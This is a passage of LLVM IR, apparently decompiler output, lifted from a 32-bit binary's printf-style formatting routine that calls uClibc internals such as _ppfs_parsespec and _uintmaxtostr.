
dec_label_pc_804e5a2:                             ; preds = %dec_label_pc_804e599
  %v1_804e5a2 = add i32 %v0_804ea6f, 1
  store i32 %v1_804e5a2, i32* %edx.global-to-local, align 4
  %v2_804e5a5 = inttoptr i32 %v1_804e5a2 to i8*
  %v3_804e5a5 = load i8, i8* %v2_804e5a5, align 1
  %v12_804e5a5 = icmp eq i8 %v3_804e5a5, 37
  br i1 %v12_804e5a5, label %dec_label_pc_804ea6f, label %dec_label_pc_804e5af

dec_label_pc_804e5af:                             ; preds = %dec_label_pc_804e5a2
  %v1_804e5af = load i32, i32* @esp, align 4
  %v2_804e5af = add i32 %v1_804e5af, 16
  %v3_804e5af = inttoptr i32 %v2_804e5af to i32*
  store i32 %v1_804e5a2, i32* %v3_804e5af, align 4
  %v0_804e5b3 = load i32, i32* @esp, align 4
  %v1_804e5b3 = add i32 %v0_804e5b3, 340
  %v2_804e5b3 = inttoptr i32 %v1_804e5b3 to i32*
  store i32 0, i32* %v2_804e5b3, align 4
  %v0_804e5be = load i32, i32* @esp, align 4
  %v1_804e5c1 = add i32 %v0_804e5be, 16
  store i32 %v1_804e5c1, i32* @ebx, align 4
  %v2_804e5c5 = add i32 %v0_804e5be, -16
  %v3_804e5c5 = inttoptr i32 %v2_804e5c5 to i32*
  store i32 %v1_804e5c1, i32* %v3_804e5c5, align 4
  %v0_804e5c6 = load i32, i32* %stack_var_-364, align 4
  %v1_804e5c6 = inttoptr i32 %v0_804e5c6 to i32*
  %v2_804e5c6 = call i32 @_ppfs_parsespec(i32* %v1_804e5c6)
  store i32 %v2_804e5c6, i32* %eax.global-to-local, align 4
  %v0_804e5cb = load i32, i32* @ebx, align 4
  %v1_804e5cb = load i32, i32* @esp, align 4
  %v2_804e5cb = inttoptr i32 %v1_804e5cb to i32*
  store i32 %v0_804e5cb, i32* %v2_804e5cb, align 4
  %v0_804e5ce = load i32, i32* %stack_var_-364, align 4
  %v1_804e5ce = call i32 @_ppfs_setargs(i32 %v0_804e5ce)
  store i32 %v1_804e5ce, i32* %eax.global-to-local, align 4
  %v0_804e5d3 = load i32, i32* @esp, align 4
  %v1_804e5d3 = add i32 %v0_804e5d3, 70
  %v2_804e5d3 = inttoptr i32 %v1_804e5d3 to i8*
  %v3_804e5d3 = load i8, i8* %v2_804e5d3, align 1
  %v4_804e5d3 = zext i8 %v3_804e5d3 to i32
  store i32 %v4_804e5d3, i32* @edi, align 4
  %v1_804e5d8 = add i32 %v0_804e5d3, 16
  %v1_804e5db = add i32 %v0_804e5d3, 56
  %v2_804e5db = inttoptr i32 %v1_804e5db to i32*
  %v3_804e5db = load i32, i32* %v2_804e5db, align 4
  %v1_804e5e0 = add i32 %v0_804e5d3, 112
  store i32 %v1_804e5e0, i32* %edx.global-to-local, align 4
  %tmp68 = icmp slt i32 %v3_804e5db, 1
  br i1 %tmp68, label %dec_label_pc_804e5ed, label %dec_label_pc_804e5e6

dec_label_pc_804e5e6:                             ; preds = %dec_label_pc_804e5af
  %v2_804e5e6 = zext i8 %v3_804e5d3 to i32
  %v3_804e5e6 = mul nuw nsw i32 %v2_804e5e6, 12
  store i32 %v3_804e5e6, i32* %eax.global-to-local, align 4
  %v2_804e5e9 = add i32 %v0_804e5d3, 100
  %v3_804e5e9 = add i32 %v2_804e5e9, %v3_804e5e6
  store i32 %v3_804e5e9, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804e5ed

dec_label_pc_804e5ed:                             ; preds = %dec_label_pc_804e5af, %dec_label_pc_804e5e6
  %v0_804e5f528 = phi i32 [ %v1_804e5e0, %dec_label_pc_804e5af ], [ %v3_804e5e9, %dec_label_pc_804e5e6 ]
  store i32 0, i32* %eax.global-to-local, align 4
  %v1_804e5ef = add i32 %v0_804e5d3, 60
  %v2_804e5ef = inttoptr i32 %v1_804e5ef to i32*
  %v3_804e5ef = load i32, i32* %v2_804e5ef, align 4
  store i32 %v3_804e5ef, i32* %ecx.global-to-local, align 4
  %v2_804e60081 = sub i32 0, %v3_804e5ef
  %v10_804e60084 = and i32 %v3_804e5ef, %v2_804e60081
  %v11_804e60085 = icmp slt i32 %v10_804e60084, 0
  %v13_804e60086 = icmp slt i32 %v2_804e60081, 0
  %v2_804e60287 = icmp eq i1 %v13_804e60086, %v11_804e60085
  br i1 %v2_804e60287, label %dec_label_pc_804e604, label %dec_label_pc_804e5f5

dec_label_pc_804e5f5:                             ; preds = %dec_label_pc_804e5ed, %dec_label_pc_804e5f5
  %v0_804e60491 = phi i32 [ %v0_804e604, %dec_label_pc_804e5f5 ], [ %v1_804e5d8, %dec_label_pc_804e5ed ]
  %v2_804e5f590 = phi i32 [ %v1_804e5ff, %dec_label_pc_804e5f5 ], [ 0, %dec_label_pc_804e5ed ]
  %v0_804e5f589 = phi i32 [ %v1_804e5fc, %dec_label_pc_804e5f5 ], [ %v0_804e5f528, %dec_label_pc_804e5ed ]
  %v3_804e5f5 = mul i32 %v2_804e5f590, 4
  %v4_804e5f5 = add i32 %v0_804e60491, 344
  %v5_804e5f5 = add i32 %v4_804e5f5, %v3_804e5f5
  %v6_804e5f5 = inttoptr i32 %v5_804e5f5 to i32*
  store i32 %v0_804e5f589, i32* %v6_804e5f5, align 4
  %v0_804e5fc = load i32, i32* %edx.global-to-local, align 4
  %v1_804e5fc = add i32 %v0_804e5fc, 12
  store i32 %v1_804e5fc, i32* %edx.global-to-local, align 4
  %v0_804e5ff = load i32, i32* %eax.global-to-local, align 4
  %v1_804e5ff = add i32 %v0_804e5ff, 1
  store i32 %v1_804e5ff, i32* %eax.global-to-local, align 4
  %v1_804e600.pre = load i32, i32* %ecx.global-to-local, align 4
  %v2_804e600 = sub i32 %v1_804e5ff, %v1_804e600.pre
  %v8_804e600 = xor i32 %v1_804e5ff, %v1_804e600.pre
  %v9_804e600 = xor i32 %v2_804e600, %v1_804e5ff
  %v10_804e600 = and i32 %v9_804e600, %v8_804e600
  %v11_804e600 = icmp slt i32 %v10_804e600, 0
  %v13_804e600 = icmp slt i32 %v2_804e600, 0
  %v2_804e602 = icmp eq i1 %v13_804e600, %v11_804e600
  %v0_804e604 = load i32, i32* @esp, align 4
  br i1 %v2_804e602, label %dec_label_pc_804e604, label %dec_label_pc_804e5f5

dec_label_pc_804e604:                             ; preds = %dec_label_pc_804e5f5, %dec_label_pc_804e5ed
  %v0_804e604.lcssa = phi i32 [ %v1_804e5d8, %dec_label_pc_804e5ed ], [ %v0_804e604, %dec_label_pc_804e5f5 ]
  %v1_804e604 = add i32 %v0_804e604.lcssa, 48
  %v2_804e604 = inttoptr i32 %v1_804e604 to i32*
  %v3_804e604 = load i32, i32* %v2_804e604, align 4
  store i32 %v3_804e604, i32* @ecx, align 4
  %v1_804e608 = icmp eq i32 %v3_804e604, 0
  %v1_804e60a = icmp eq i1 %v1_804e608, false
  br i1 %v1_804e60a, label %dec_label_pc_804e632, label %dec_label_pc_804e60c

dec_label_pc_804e60c:                             ; preds = %dec_label_pc_804e604
  %v1_804e60c = inttoptr i32 %v0_804e604.lcssa to i32*
  %v2_804e60c = load i32, i32* %v1_804e60c, align 4
  store i32 %v2_804e60c, i32* %eax.global-to-local, align 4
  %v1_804e60f = ashr i32 %v2_804e60c, 31
  store i32 %v1_804e60f, i32* %edx.global-to-local, align 4
  %v2_804e610 = add i32 %v0_804e604.lcssa, -4
  %v3_804e610 = inttoptr i32 %v2_804e610 to i32*
  store i32 %v1_804e60f, i32* %v3_804e610, align 4
  %v0_804e611 = load i32, i32* %eax.global-to-local, align 4
  %v2_804e611 = add i32 %v0_804e604.lcssa, -8
  %v3_804e611 = inttoptr i32 %v2_804e611 to i32*
  store i32 %v0_804e611, i32* %v3_804e611, align 4
  %v1_804e612 = add i32 %v0_804e604.lcssa, 32
  %v2_804e612 = inttoptr i32 %v1_804e612 to i32*
  %v3_804e612 = load i32, i32* %v2_804e612, align 4
  %v1_804e616 = and i32 %v3_804e612, 3840
  store i32 %v1_804e616, i32* %eax.global-to-local, align 4
  %v2_804e61b = add i32 %v0_804e604.lcssa, -12
  %v3_804e61b = inttoptr i32 %v2_804e61b to i32*
  store i32 %v1_804e616, i32* %v3_804e61b, align 4
  %v1_804e61c = add i32 %v0_804e604.lcssa, 344
  %v2_804e61c = inttoptr i32 %v1_804e61c to i32*
  %v3_804e61c = load i32, i32* %v2_804e61c, align 4
  store i32 %v3_804e61c, i32* %eax.global-to-local, align 4
  %v1_804e623 = inttoptr i32 %v3_804e61c to i32*
  %v2_804e623 = load i32, i32* %v1_804e623, align 4
  %v4_804e623 = add i32 %v0_804e604.lcssa, -16
  %v5_804e623 = inttoptr i32 %v4_804e623 to i32*
  store i32 %v2_804e623, i32* %v5_804e623, align 4
  %v0_804e625 = call i32 @_store_inttype()
  store i32 %v0_804e625, i32* %eax.global-to-local, align 4
  %v0_804e62a = load i32, i32* @esp, align 4
  %v1_804e62a = add i32 %v0_804e62a, 16
  br label %dec_label_pc_804ea64

dec_label_pc_804e632:                             ; preds = %dec_label_pc_804e604
  %tmp94 = icmp ult i32 %v3_804e604, 8
  br i1 %tmp94, label %dec_label_pc_804e63b, label %dec_label_pc_804e79c

dec_label_pc_804e63b:                             ; preds = %dec_label_pc_804e632
  %v1_804e63b = add i32 %v3_804e604, 134558096
  %v2_804e63b = inttoptr i32 %v1_804e63b to i8*
  %v3_804e63b = load i8, i8* %v2_804e63b, align 1
  %v4_804e63b = sext i8 %v3_804e63b to i32
  store i32 %v4_804e63b, i32* @esi, align 4
  store i32 87, i32* @ebx, align 4
  %v9_804e647 = icmp eq i8 %v3_804e63b, 10
  %v1_804e64a = icmp eq i1 %v9_804e647, false
  br i1 %v1_804e64a, label %dec_label_pc_804e668, label %dec_label_pc_804e64c

dec_label_pc_804e64c:                             ; preds = %dec_label_pc_804e63b
  %v1_804e64c = add i32 %v0_804e604.lcssa, 32
  %v2_804e64c = inttoptr i32 %v1_804e64c to i32*
  %v3_804e64c = load i32, i32* %v2_804e64c, align 4
  %v1_804e652 = and i32 %v3_804e64c, 32
  store i32 %v1_804e652, i32* %eax.global-to-local, align 4
  %tmp69 = udiv i32 %v1_804e652, 32
  %tmp70 = sub nsw i32 45, %tmp69
  store i32 %tmp70, i32* @ebx, align 4
  %v1_804e660 = trunc i32 %v3_804e64c to i8
  %v2_804e660 = and i8 %v1_804e660, 64
  %v3_804e660 = icmp eq i8 %v2_804e660, 0
  %v5_804e660 = zext i8 %v2_804e660 to i32
  %v7_804e660 = and i32 %v3_804e64c, -256
  %v8_804e660 = or i32 %v5_804e660, %v7_804e660
  store i32 %v8_804e660, i32* %edx.global-to-local, align 4
  br i1 %v3_804e660, label %dec_label_pc_804e668, label %dec_label_pc_804e665

dec_label_pc_804e665:                             ; preds = %dec_label_pc_804e64c
  %v2_804e665 = or i32 %tmp70, 128
  store i32 %v2_804e665, i32* @ebx, align 4
  br label %dec_label_pc_804e668

dec_label_pc_804e668:                             ; preds = %dec_label_pc_804e64c, %dec_label_pc_804e63b, %dec_label_pc_804e665
  %tmp95 = icmp ult i32 %v3_804e604, 6
  br i1 %tmp95, label %dec_label_pc_804e66d, label %dec_label_pc_804e685

dec_label_pc_804e66d:                             ; preds = %dec_label_pc_804e668
  %v9_804e66d = icmp eq i32 %v3_804e604, 3
  %v1_804e670 = icmp eq i1 %v9_804e66d, false
  br i1 %v1_804e670, label %dec_label_pc_804e679, label %dec_label_pc_804e672

dec_label_pc_804e672:                             ; preds = %dec_label_pc_804e66d
  store i32 55, i32* @ebx, align 4
  br label %dec_label_pc_804e687

dec_label_pc_804e679:                             ; preds = %dec_label_pc_804e66d
  %v9_804e67e = icmp eq i32 %v3_804e604, 1
  br i1 %v9_804e67e, label %dec_label_pc_804e68c, label %dec_label_pc_804e687

dec_label_pc_804e685:                             ; preds = %dec_label_pc_804e668
  %v1_804e685 = sub nsw i32 0, %v4_804e63b
  store i32 %v1_804e685, i32* @esi, align 4
  br label %dec_label_pc_804e687

dec_label_pc_804e687:                             ; preds = %dec_label_pc_804e679, %dec_label_pc_804e672, %dec_label_pc_804e685
  br label %dec_label_pc_804e68c

dec_label_pc_804e68c:                             ; preds = %dec_label_pc_804e679, %dec_label_pc_804e687
  %storemerge106 = phi i32 [ 11, %dec_label_pc_804e687 ], [ 6, %dec_label_pc_804e679 ]
  store i32 %storemerge106, i32* @ebp, align 4
  %v1_804e68c = add i32 %v0_804e604.lcssa, 7
  %v2_804e68c = inttoptr i32 %v1_804e68c to i8*
  store i8 32, i8* %v2_804e68c, align 1
  %v0_804e691 = load i32, i32* @esp, align 4
  %v1_804e691 = add i32 %v0_804e691, 20
  %v2_804e691 = inttoptr i32 %v1_804e691 to i32*
  %v3_804e691 = load i32, i32* %v2_804e691, align 4
  %v5_804e691 = icmp slt i32 %v3_804e691, 0
  %v1_804e696 = icmp eq i1 %v5_804e691, false
  br i1 %v1_804e696, label %dec_label_pc_804e6a0, label %dec_label_pc_804e698

dec_label_pc_804e698:                             ; preds = %dec_label_pc_804e68c
  %v1_804e698 = add i32 %v0_804e691, 36
  %v2_804e698 = inttoptr i32 %v1_804e698 to i8*
  %v3_804e698 = load i8, i8* %v2_804e698, align 1
  %v4_804e698 = zext i8 %v3_804e698 to i32
  %v5_804e698 = load i32, i32* %edx.global-to-local, align 4
  %v6_804e698 = and i32 %v5_804e698, -256
  %v7_804e698 = or i32 %v6_804e698, %v4_804e698
  store i32 %v7_804e698, i32* %edx.global-to-local, align 4
  %v3_804e69c = add i32 %v0_804e691, 7
  %v4_804e69c = inttoptr i32 %v3_804e69c to i8*
  store i8 %v3_804e698, i8* %v4_804e69c, align 1
  %v0_804e6a0.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804e6a0

dec_label_pc_804e6a0:                             ; preds = %dec_label_pc_804e68c, %dec_label_pc_804e698
  %v1_804e6b9 = phi i32 [ %v0_804e691, %dec_label_pc_804e68c ], [ %v0_804e6a0.pre, %dec_label_pc_804e698 ]
  %v1_804e6a0 = add i32 %v1_804e6b9, 344
  %v2_804e6a0 = inttoptr i32 %v1_804e6a0 to i32*
  %v3_804e6a0 = load i32, i32* %v2_804e6a0, align 4
  store i32 %v3_804e6a0, i32* %eax.global-to-local, align 4
  store i32 1024, i32* %edx.global-to-local, align 4
  %v1_804e6ac = add i32 %v3_804e604, -1
  %v8_804e6ac = icmp eq i32 %v1_804e6ac, 0
  store i32 %v1_804e6ac, i32* %ecx.global-to-local, align 4
  %v0_804e6b9.pre = load i32, i32* @edi, align 4
  br i1 %v8_804e6ac, label %dec_label_pc_804e6b9, label %dec_label_pc_804e6af

dec_label_pc_804e6af:                             ; preds = %dec_label_pc_804e6a0
  %v2_804e6af = mul i32 %v0_804e6b9.pre, 4
  %v3_804e6af = add i32 %v1_804e6b9, 52
  %v4_804e6af = add i32 %v3_804e6af, %v2_804e6af
  %v5_804e6af = inttoptr i32 %v4_804e6af to i32*
  %v6_804e6af = load i32, i32* %v5_804e6af, align 4
  %v1_804e6b3 = and i32 %v6_804e6af, 3840
  store i32 %v1_804e6b3, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804e6b9

dec_label_pc_804e6b9:                             ; preds = %dec_label_pc_804e6a0, %dec_label_pc_804e6af
  %v2_804e6b9 = add i32 %v1_804e6b9, -4
  %v3_804e6b9 = inttoptr i32 %v2_804e6b9 to i32*
  store i32 %v0_804e6b9.pre, i32* %v3_804e6b9, align 4
  %v0_804e6ba = load i32, i32* @esi, align 4
  %v2_804e6ba = add i32 %v1_804e6b9, -8
  %v3_804e6ba = inttoptr i32 %v2_804e6ba to i32*
  store i32 %v0_804e6ba, i32* %v3_804e6ba, align 4
  %v0_804e6bb = load i32, i32* %eax.global-to-local, align 4
  %v2_804e6bb = add i32 %v1_804e6b9, -12
  %v3_804e6bb = inttoptr i32 %v2_804e6bb to i32*
  store i32 %v0_804e6bb, i32* %v3_804e6bb, align 4
  %v0_804e6bc = load i32, i32* %edx.global-to-local, align 4
  %v2_804e6bc = add i32 %v1_804e6b9, -16
  %v3_804e6bc = inttoptr i32 %v2_804e6bc to i32*
  store i32 %v0_804e6bc, i32* %v3_804e6bc, align 4
  %v0_804e6bd = call i32 @_load_inttype()
  %v0_804e6c2 = load i32, i32* @ebx, align 4
  %v1_804e6c2 = load i32, i32* @esp, align 4
  %v2_804e6c2 = inttoptr i32 %v1_804e6c2 to i32*
  store i32 %v0_804e6c2, i32* %v2_804e6c2, align 4
  %v0_804e6c5 = load i32, i32* @esi, align 4
  %v1_804e6c5 = load i32, i32* @esp, align 4
  %v2_804e6c5 = add i32 %v1_804e6c5, -4
  %v3_804e6c5 = inttoptr i32 %v2_804e6c5 to i32*
  store i32 %v0_804e6c5, i32* %v3_804e6c5, align 4
  %v0_804e6c6 = load i32, i32* @edx, align 4
  %v2_804e6c6 = add i32 %v1_804e6c5, -8
  %v3_804e6c6 = inttoptr i32 %v2_804e6c6 to i32*
  store i32 %v0_804e6c6, i32* %v3_804e6c6, align 4
  %v2_804e6c7 = add i32 %v1_804e6c5, -12
  %v3_804e6c7 = inttoptr i32 %v2_804e6c7 to i32*
  store i32 %v0_804e6bd, i32* %v3_804e6c7, align 4
  %v1_804e6c8 = add i32 %v1_804e6c5, 347
  store i32 %v1_804e6c8, i32* %eax.global-to-local, align 4
  %v2_804e6cf = add i32 %v1_804e6c5, -16
  %v3_804e6cf = inttoptr i32 %v2_804e6cf to i32*
  store i32 %v1_804e6c8, i32* %v3_804e6cf, align 4
  %v0_804e6d0 = load i32, i32* %stack_var_-364, align 4
  %v5_804e6d0 = inttoptr i32 %v0_804e6d0 to i8*
  %v6_804e6d0 = call i32 @_uintmaxtostr(i8* %v5_804e6d0, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v6_804e6d0, i32* %eax.global-to-local, align 4
  %v0_804e6d5 = load i32, i32* @esp, align 4
  %v1_804e6d5 = add i32 %v0_804e6d5, 32
  store i32 %v6_804e6d0, i32* @edi, align 4
  %v1_804e6da = add i32 %v0_804e6d5, 80
  %v2_804e6da = inttoptr i32 %v1_804e6da to i32*
  %v3_804e6da = load i32, i32* %v2_804e6da, align 4
  %tmp96 = icmp ult i32 %v3_804e6da, 6
  br i1 %tmp96, label %dec_label_pc_804e708, label %dec_label_pc_804e6e1

dec_label_pc_804e6e1:                             ; preds = %dec_label_pc_804e6b9
  %v1_804e6e1 = inttoptr i32 %v6_804e6d0 to i8*
  %v2_804e6e1 = load i8, i8* %v1_804e6e1, align 1
  %v11_804e6e1 = icmp eq i8 %v2_804e6e1, 45
  %v1_804e6e4 = icmp eq i1 %v11_804e6e1, false
  %v1_804e6f3 = add i32 %v0_804e6d5, 64
  %v2_804e6f3 = inttoptr i32 %v1_804e6f3 to i32*
  %v3_804e6f3 = load i32, i32* %v2_804e6f3, align 4
  br i1 %v1_804e6e4, label %dec_label_pc_804e6f3, label %dec_label_pc_804e6e6

dec_label_pc_804e6e6:                             ; preds = %dec_label_pc_804e6e1
  %v4_804e6e6 = or i32 %v3_804e6f3, 2
  store i32 %v4_804e6e6, i32* %v2_804e6f3, align 4
  %v0_804e6eb = load i32, i32* @edi, align 4
  %v1_804e6eb = add i32 %v0_804e6eb, 1
  store i32 %v1_804e6eb, i32* @edi, align 4
  store i32 2, i32* @ebp, align 4
  %v0_804e708.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804e708

dec_label_pc_804e6f3:                             ; preds = %dec_label_pc_804e6e1
  store i32 %v3_804e6f3, i32* %eax.global-to-local, align 4
  %v2_804e6f7 = and i32 %v3_804e6f3, 2
  %v3_804e6f7 = icmp eq i32 %v2_804e6f7, 0
  br i1 %v3_804e6f7, label %dec_label_pc_804e6ff, label %dec_label_pc_804e6fb

dec_label_pc_804e6fb:                             ; preds = %dec_label_pc_804e6f3
  store i32 0, i32* @ebp, align 4
  br label %dec_label_pc_804e708

dec_label_pc_804e6ff:                             ; preds = %dec_label_pc_804e6f3
  %v2_804e6ff = urem i32 %v3_804e6f3, 2
  %v3_804e6ff = icmp eq i32 %v2_804e6ff, 0
  br i1 %v3_804e6ff, label %dec_label_pc_804e708, label %dec_label_pc_804e703

dec_label_pc_804e703:                             ; preds = %dec_label_pc_804e6ff
  store i32 4, i32* @ebp, align 4
  br label %dec_label_pc_804e708

dec_label_pc_804e708:                             ; preds = %dec_label_pc_804e6ff, %dec_label_pc_804e6b9, %dec_label_pc_804e6fb, %dec_label_pc_804e6e6, %dec_label_pc_804e703
  %v0_804e75b = phi i32 [ %v6_804e6d0, %dec_label_pc_804e6ff ], [ %v6_804e6d0, %dec_label_pc_804e6b9 ], [ %v6_804e6d0, %dec_label_pc_804e6fb ], [ %v1_804e6eb, %dec_label_pc_804e6e6 ], [ %v6_804e6d0, %dec_label_pc_804e703 ]
  %v0_804e76a = phi i32 [ %v1_804e6d5, %dec_label_pc_804e6ff ], [ %v1_804e6d5, %dec_label_pc_804e6b9 ], [ %v1_804e6d5, %dec_label_pc_804e6fb ], [ %v0_804e708.pre, %dec_label_pc_804e6e6 ], [ %v1_804e6d5, %dec_label_pc_804e703 ]
  %v1_804e708 = add i32 %v0_804e76a, 204
  store i32 %v1_804e708, i32* %ecx.global-to-local, align 4
  %v1_804e70f = add i32 %v0_804e76a, 20
  %v2_804e70f = inttoptr i32 %v1_804e70f to i32*
  %v3_804e70f = load i32, i32* %v2_804e70f, align 4
  store i32 %v3_804e70f, i32* %edx.global-to-local, align 4
  %v2_804e713 = sub i32 %v1_804e708, %v0_804e75b
  store i32 %v2_804e713, i32* %ecx.global-to-local, align 4
  %v2_804e715 = icmp slt i32 %v3_804e70f, 0
  %v1_804e717 = add i32 %v2_804e713, 127
  store i32 %v1_804e717, i32* @esi, align 4
  %v1_804e71a = icmp eq i1 %v2_804e715, false
  br i1 %v1_804e71a, label %dec_label_pc_804e721, label %dec_label_pc_804e71c

dec_label_pc_804e71c:                             ; preds = %dec_label_pc_804e708
  store i32 1, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804e721

dec_label_pc_804e721:                             ; preds = %dec_label_pc_804e708, %dec_label_pc_804e71c
  %v0_804e747 = phi i32 [ %v3_804e70f, %dec_label_pc_804e708 ], [ 1, %dec_label_pc_804e71c ]
  %v1_804e721 = add i32 %v0_804e76a, 32
  %v2_804e721 = inttoptr i32 %v1_804e721 to i8*
  %v3_804e721 = load i8, i8* %v2_804e721, align 1
  %v4_804e721 = and i8 %v3_804e721, 16
  %v5_804e721 = icmp eq i8 %v4_804e721, 0
  br i1 %v5_804e721, label %dec_label_pc_804e75b, label %dec_label_pc_804e728

dec_label_pc_804e728:                             ; preds = %dec_label_pc_804e721
  %v1_804e728 = add i32 %v0_804e76a, 48
  %v2_804e728 = inttoptr i32 %v1_804e728 to i32*
  %v3_804e728 = load i32, i32* %v2_804e728, align 4
  store i32 %v3_804e728, i32* %eax.global-to-local, align 4
  %tmp97 = icmp ult i32 %v3_804e728, 3
  br i1 %tmp97, label %dec_label_pc_804e742.thread, label %dec_label_pc_804e736

dec_label_pc_804e742.thread:                      ; preds = %dec_label_pc_804e728
  store i32 6, i32* @ebp, align 4
  br label %dec_label_pc_804e75b

dec_label_pc_804e736:                             ; preds = %dec_label_pc_804e728
  %v9_804e736 = icmp eq i32 %v3_804e728, 3
  %v1_804e739 = icmp eq i1 %v9_804e736, false
  br i1 %v1_804e739, label %dec_label_pc_804e742, label %dec_label_pc_804e73b

dec_label_pc_804e73b:                             ; preds = %dec_label_pc_804e736
  store i32 9, i32* @ebp, align 4
  br label %dec_label_pc_804e75b

dec_label_pc_804e742:                             ; preds = %dec_label_pc_804e736
  %v9_804e742 = icmp eq i32 %v3_804e728, 4
  %v1_804e745 = icmp eq i1 %v9_804e742, false
  br i1 %v1_804e745, label %dec_label_pc_804e75b, label %dec_label_pc_804e747

dec_label_pc_804e747:                             ; preds = %dec_label_pc_804e742
  %tmp98 = icmp ugt i32 %v0_804e747, %v1_804e717
  br i1 %tmp98, label %dec_label_pc_804e75b, label %dec_label_pc_804e74b

dec_label_pc_804e74b:                             ; preds = %dec_label_pc_804e747
  store i32 1, i32* %edx.global-to-local, align 4
  %v1_804e750 = inttoptr i32 %v0_804e75b to i8*
  %v2_804e750 = load i8, i8* %v1_804e750, align 1
  %v8_804e750 = icmp eq i8 %v2_804e750, 48
  br i1 %v8_804e750, label %dec_label_pc_804e75b, label %dec_label_pc_804e755

dec_label_pc_804e755:                             ; preds = %dec_label_pc_804e74b
  %v1_804e755 = add i32 %v2_804e713, 128
  store i32 %v1_804e755, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804e75b

dec_label_pc_804e75b:                             ; preds = %dec_label_pc_804e742.thread, %dec_label_pc_804e747, %dec_label_pc_804e74b, %dec_label_pc_804e742, %dec_label_pc_804e721, %dec_label_pc_804e73b, %dec_label_pc_804e755
  %v0_804e793 = phi i32 [ %v0_804e747, %dec_label_pc_804e747 ], [ 1, %dec_label_pc_804e74b ], [ %v0_804e747, %dec_label_pc_804e742 ], [ %v0_804e747, %dec_label_pc_804e721 ], [ %v0_804e747, %dec_label_pc_804e73b ], [ %v1_804e755, %dec_label_pc_804e755 ], [ %v0_804e747, %dec_label_pc_804e742.thread ]
  %v1_804e75b = inttoptr i32 %v0_804e75b to i8*
  %v2_804e75b = load i8, i8* %v1_804e75b, align 1
  %v8_804e75b = icmp eq i8 %v2_804e75b, 48
  %v1_804e75e = icmp eq i1 %v8_804e75b, false
  br i1 %v1_804e75e, label %dec_label_pc_804e78b, label %dec_label_pc_804e760

dec_label_pc_804e760:                             ; preds = %dec_label_pc_804e75b
  %v0_804e760 = load i32, i32* @ebp, align 4
  %v7_804e763 = icmp sgt i32 %v0_804e760, 5
  br i1 %v7_804e763, label %dec_label_pc_804e765, label %dec_label_pc_804e76a

dec_label_pc_804e765:                             ; preds = %dec_label_pc_804e760
  store i32 11, i32* @ebp, align 4
  br label %dec_label_pc_804e76a

dec_label_pc_804e76a:                             ; preds = %dec_label_pc_804e760, %dec_label_pc_804e765
  %v1_804e76a = add i32 %v0_804e76a, 48
  %v2_804e76a = inttoptr i32 %v1_804e76a to i32*
  %v3_804e76a = load i32, i32* %v2_804e76a, align 4
  %v12_804e76a = icmp eq i32 %v3_804e76a, 1
  %v1_804e76f = icmp eq i1 %v12_804e76a, false
  br i1 %v1_804e76f, label %dec_label_pc_804e780, label %dec_label_pc_804e771

dec_label_pc_804e771:                             ; preds = %dec_label_pc_804e76a
  store i32 ptrtoint ([6 x i8]* @global_var_8053178.102 to i32), i32* @edi, align 4
  store i32 5, i32* @esi, align 4
  br label %dec_label_pc_804e8fc

dec_label_pc_804e780:                             ; preds = %dec_label_pc_804e76a
  %v1_804e780 = icmp eq i32 %v0_804e793, 0
  %v1_804e782 = icmp eq i1 %v1_804e780, false
  br i1 %v1_804e782, label %dec_label_pc_804e78b, label %dec_label_pc_804e784

dec_label_pc_804e784:                             ; preds = %dec_label_pc_804e780
  store i32 0, i32* @esi, align 4
  br label %dec_label_pc_804e8fc

dec_label_pc_804e78b:                             ; preds = %dec_label_pc_804e780, %dec_label_pc_804e75b
  %v2_804e78b = sub i32 %v0_804e793, %v1_804e717
  %v7_804e78b = icmp ult i32 %v0_804e793, %v1_804e717
  %v12_804e78b = icmp eq i32 %v2_804e78b, 0
  %v2_804e78d = or i1 %v7_804e78b, %v12_804e78b
  br i1 %v2_804e78d, label %dec_label_pc_804e8fc, label %dec_label_pc_804e793

dec_label_pc_804e793:                             ; preds = %dec_label_pc_804e78b
  store i32 %v2_804e78b, i32* @ebx, align 4
  br label %dec_label_pc_804e916

dec_label_pc_804e79c:                             ; preds = %dec_label_pc_804e632
  %tmp99 = icmp ult i32 %v3_804e604, 16
  br i1 %tmp99, label %dec_label_pc_804e7a1, label %dec_label_pc_804e7e6

dec_label_pc_804e7a1:                             ; preds = %dec_label_pc_804e79c
  %v1_804e7a1 = add i32 %v0_804e604.lcssa, 33
  %v2_804e7a1 = inttoptr i32 %v1_804e7a1 to i8*
  %v3_804e7a1 = load i8, i8* %v2_804e7a1, align 1
  %v4_804e7a1 = and i8 %v3_804e7a1, 8
  %v5_804e7a1 = icmp eq i8 %v4_804e7a1, 0
  %v1_804e7a6 = add i32 %v0_804e604.lcssa, 344
  %v2_804e7a6 = inttoptr i32 %v1_804e7a6 to i32*
  %v3_804e7a6 = load i32, i32* %v2_804e7a6, align 4
  store i32 %v3_804e7a6, i32* %edx.global-to-local, align 4
  br i1 %v5_804e7a1, label %dec_label_pc_804e7b3, label %dec_label_pc_804e7af

dec_label_pc_804e7af:                             ; preds = %dec_label_pc_804e7a1
  %v1_804e7af = inttoptr i32 %v3_804e7a6 to x86_fp80*
  %v2_804e7af = load x86_fp80, x86_fp80* %v1_804e7af, align 4
  br label %dec_label_pc_804e7b5

dec_label_pc_804e7b3:                             ; preds = %dec_label_pc_804e7a1
  %v1_804e7b3 = inttoptr i32 %v3_804e7a6 to double*
  %v2_804e7b3 = load double, double* %v1_804e7b3, align 4
  %v3_804e7b3 = fpext double %v2_804e7b3 to x86_fp80
  br label %dec_label_pc_804e7b5

dec_label_pc_804e7b5:                             ; preds = %dec_label_pc_804e7af, %dec_label_pc_804e7b3
  %storemerge5 = phi x86_fp80 [ %v2_804e7af, %dec_label_pc_804e7af ], [ %v3_804e7b3, %dec_label_pc_804e7b3 ]
  store x86_fp80 %storemerge5, x86_fp80* %st0.global-to-local, align 4
  %v0_804e7b5 = load i32, i32* @esi, align 4
  %v2_804e7b5 = add i32 %v0_804e604.lcssa, -4
  %v3_804e7b5 = inttoptr i32 %v2_804e7b5 to i32*
  store i32 %v0_804e7b5, i32* %v3_804e7b5, align 4
